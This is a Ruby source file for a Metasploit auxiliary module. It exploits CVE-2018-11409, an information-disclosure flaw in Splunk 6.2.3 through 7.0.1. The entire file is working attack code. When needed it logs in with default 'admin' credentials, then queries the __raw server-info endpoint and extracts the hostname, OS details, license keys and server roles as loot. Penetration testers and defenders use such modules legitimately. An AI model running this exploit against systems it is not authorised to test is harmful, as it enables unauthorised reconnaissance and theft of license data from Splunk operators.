##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Splunk __raw Server Info Disclosure ',
        'Description' => %q{
          Splunk 6.2.3 through 7.0.1 allows information disclosure by appending
          /__raw/services/server/info/server-info?output_mode=json to a query.
          Versisons 6.6.0 through 7.0.1 require authentication.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'n00bhaxor', # msf module
          'KOF2002', # original PoC
          'h00die' # 6.6.0+
        ],
        'References' => [
          [ 'EDB', '44865' ],
          [ 'URL', 'https://web.archive.org/web/20201124061756/https://www.splunk.com/en_us/product-security/announcements-archive/SP-CAAAP5E.html'],
          [ 'CVE', '2018-11409']
        ],
        'DisclosureDate' => '2018-06-08',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => [IOC_IN_LOGS]
        }
      )
    )
    register_options(
      [
        Opt::RPORT(8000),
        OptString.new('USERNAME', [ false, 'User to login with', 'admin']),
        OptString.new('PASSWORD', [ false, 'Password to login with', '']),
        OptString.new('TARGETURI', [ true, 'The URI of the Splunk Application', ''])
      ]
    )
  end

  def authenticate
    login_url = normalize_uri(target_uri.path, 'en-US', 'account', 'login')

    res = send_request_cgi({
      'method' => 'GET',
      'uri' => login_url
    })

    unless res
      fail_with(Failure::Unreachable, 'No response received for authentication request')
    end

    cval_value = res.get_cookies.match(/cval=([^;]+)/)[1]

    unless cval_value
      fail_with(Failure::UnexpectedReply, 'Failed to retrieve the cval cookie for authentication')
    end

    auth_payload = {
      'username' => datastore['USERNAME'],
      'password' => datastore['PASSWORD'],
      'cval' => cval_value,
      'set_has_logged_in' => 'false'
    }

    res = send_request_cgi({
      'method' => 'POST',
      'uri' => login_url,
      'keep_cookies' => true,
      'vars_post' => auth_payload
    })

    unless res && res.code == 200
      fail_with(Failure::NoAccess, 'Failed to authenticate on the Splunk instance')
    end

    print_good('Successfully authenticated on the Splunk instance')
  end

  def get_contents
    request = {
      'uri' => normalize_uri(target_uri.path, 'en-US', 'splunkd', '__raw', 'services', 'server', 'info', 'server-info'),
      'keep_cookies' => true,
      'vars_get' => {
        'output_mode' => 'json'
      }
    }
    res = send_request_cgi(request)

    fail_with(Failure::Unreachable, "#{peer} - Could not connect to web service - no response") if res.nil?
    # 200 is <6.6.0 success, 303 is >=6.6.0 likely success but need auth first
    fail_with(Failure::UnexpectedReply, "#{peer} - Invalid response(response code: #{res.code})") unless res.code == 200 || res.code == 303
    res
  end

  def run
    # on 6.2.x-6.5.x this will work as its unauth
    res = get_contents
    # if we hit 6.6.0 - 7.1.0 we need to auth first
    if res.body == '{"messages":[{"type":"ERROR","text":"See Other"}]}'
      print_status('Authentication required, logging in and re-attempting')
      authenticate
      res = get_contents
    end

    j = res.get_json_document

    loot_path = store_loot('splunk.system.status', 'application/json', datastore['RHOST'], res.body, 'system_status.json')
    print_good("Output saved to #{loot_path}")

    print_good("Hostname: #{j['entry'][0]['content']['host_fqdn']}")
    print_good("CPU Architecture: #{j['entry'][0]['content']['cpu_arch']}")
    print_good("Operating System: #{j['entry'][0]['content']['os_name']}")
    print_good("OS Build: #{j['entry'][0]['content']['os_build']}")
    print_good("OS Version: #{j['entry'][0]['content']['os_version']}")
    print_good("Splunk Version: #{j['generator']['version']}")
    print_good("Trial Version?: #{j['entry'][0]['content']['isTrial']}")
    print_good("Splunk Forwarder?: #{j['entry'][0]['content']['isForwarding']}")
    print_good("Splunk Product Type: #{j['entry'][0]['content']['product_type']}")
    print_good("License State: #{j['entry'][0]['content']['licenseState']}")
    print_good("License Key\(s\): #{j['entry'][0]['content']['licenseKeys']}")
    print_good("Splunk Server Roles: #{j['entry'][0]['content']['server_roles']}")
    converted_time = DateTime.strptime(j['entry'][0]['content']['startup_time'].to_s, '%s').strftime('%Y-%m-%d %H:%M:%S')
    print_good("Splunk Server Startup Time: #{converted_time}")
  end
end
